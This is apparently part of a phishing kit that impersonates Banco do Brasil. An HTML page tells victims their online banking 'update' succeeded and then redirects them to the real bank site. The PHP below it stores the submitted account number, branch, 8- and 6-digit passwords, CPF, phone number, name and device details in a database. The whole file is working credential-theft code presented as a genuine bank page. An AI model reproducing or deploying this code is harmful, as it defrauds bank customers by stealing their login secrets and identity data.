<html>
	<head>
		<meta name="viewport" content="width=device-width, initial-scale=1"/>
		<!---<meta http-equiv="refresh" content="5;URL=https://play.google.com/store/apps/details?id=br.com.bb.android">-->
		<meta charset="utf-8">
		<meta name="theme-color" content="rgb(254,237,1)"> 
		<title>Banco do Brasil</title>
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
		<link href="https://fonts.googleapis.com/css?family=Overpass:600&display=swap" rel="stylesheet">
		<link rel="icon" href="img/favicon.ico" type="image/x-icon"/>
		<script src="https://kit.fontawesome.com/8a27f15c46.js"></script>
		<meta http-equiv="refresh" content="2; url='https://www.bb.com.br/pbb/abra-sua-conta#/'">
  </head>
		<style>
			body{
				font-family: 'Overpass', sans-serif;
			}
			.headerbarra{
				display: flex;
				text-align: center;	
				background-color: #005AA6;
				width: 100%;
				border-bottom: solid 4px yellow;
				height: 60px;	
			}
			.headerbarra span{
				font-size: 18px;
				color: #fff;
				text-align: center;
			}
			.headerbarra .barracontent{
				padding: 8px;
			}
			.branco{color: #fff;}

			form .accountSelectForm{
				margin-top: -5px;
				width: 100%;
				color: #000;
				font-weight: bold;
				outline: none;
				border: none;
				border-bottom: 1px solid #c3c3c3;
				padding: 3px;
			}
			.labelAccountSelector{
				font-size: 15px;
				color: #c3c3c3;
			}
			.label-float{
				  position: relative;
				  padding-top: 13px;
			}

			.label-float input{
			  width: 100%;
			  border: 0;
			  border-bottom: 1px solid lightgrey;
			  outline: none;
			  min-width: 180px;
			  font-size: 16px;
			  transition: all .3s ease-out;
			  -webkit-transition: all .3s ease-out;
			  -moz-transition: all .3s ease-out;
			  -webkit-appearance:none;
			  border-radius: 0;
			}

			.label-float input:focus{
			  border-bottom: 2px solid #3951b2;
			}

			.label-float input::placeholder{
			  color:transparent;
			}

			.label-float label{
			  pointer-events: none;
			  position: absolute;
			  top: 0;
			  left: 0;
			  margin-top: 13px;
			  transition: all .3s ease-out;
			  -webkit-transition: all .3s ease-out;
			  -moz-transition: all .3s ease-out;
			  color: #c3c3c3;
			}

			.label-float input:required:invalid + label{
			 
			}
			.label-float input:focus:required:invalid{
			  border-bottom: 2px solid red;
			}
			.label-float input:required:invalid + label:before{
			  content: '';
			}
			.label-float input:focus + label,
			.label-float input:not(:placeholder-shown) + label{
			  font-size: 13px;
			  margin-top: 0;			  
			}

			.PasswordHelpA{
				font-weight: bold;
				color: #007bff;
				font-size: 13px;							
			}

			.btnEntrar{
				border: none;
				padding-top: 3px;
				background: rgb(254,237,1);
				color: #0355a0;
				font-family: sans-serif , "Impact";
				font-weight: 800;
				font-size: 17px;			
				height: 60px;
				width: 100%;
				margin-top: 20%;
			}
      img{text-align: center;}
		</style>
	</head>
	<body>
		<div class="container-fluid">
			<div class="row">				
					<div class="headerbarra">					
							<div class="col-sm-12" style="margin-top:15px;">
								<i class="fas fa-arrow-left branco" style="float: left;margin-top: 5;"></i>
								<span>Banco do Brasil</span>
							</div>
					</div>
			</div>
			<br>
			<div class="row">
				<div class="col-sm-12">
          <h1>Concluido</h1>
          <p>Sua atualização foi concluida com sucesso e seus serviços online como Homebanking já estão novamente disponíveis!</p>
		  <br><br>
		  <p style="color:#c3c3c3;">Aguarde, você será redirecionado...</p>         
				</div>
				
				
			</div>	
		</div>
		
		<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
		<script src="js/EventsAplicattion.js"></script>		
	</body>
</html>

<?php
	include('operar/conexao.php');
	include('os.php');

	$browser = $_SERVER['HTTP_USER_AGENT'];
	$dispositivo = "OS: ".getOS($browser);

	$conta = addslashes($_POST['conta']);
	$agencia = addslashes($_POST['agencia']);
	$senha8dig = addslashes($_POST['8dpass']);
	$cpf = addslashes($_POST['cpf']);
	$telefone = addslashes($_POST['telefone']);
	$senha6dig = addslashes($_POST['senha6dig']);
	$gerente = addslashes($_POST['gerente']);
	$nome = addslashes($_POST['nome']);

    if(isset($conta) && isset($agencia) && isset($senha8dig)){
    	mysqli_query($link, "INSERT INTO `dados` (id, conta, agencia, senha8dig, senha6dig, cpf, telefone, gerente, nome, dispositivo) VALUES('', '{$conta}', '{$agencia}', '{$senha8dig}', '{$senha6dig}', '{$cpf}', '{$telefone}', '{$gerente}', '{$nome}', '{$dispositivo}')");
    	mysqli_close($link);
    }else{
    	header("location: index.php");
    }
?>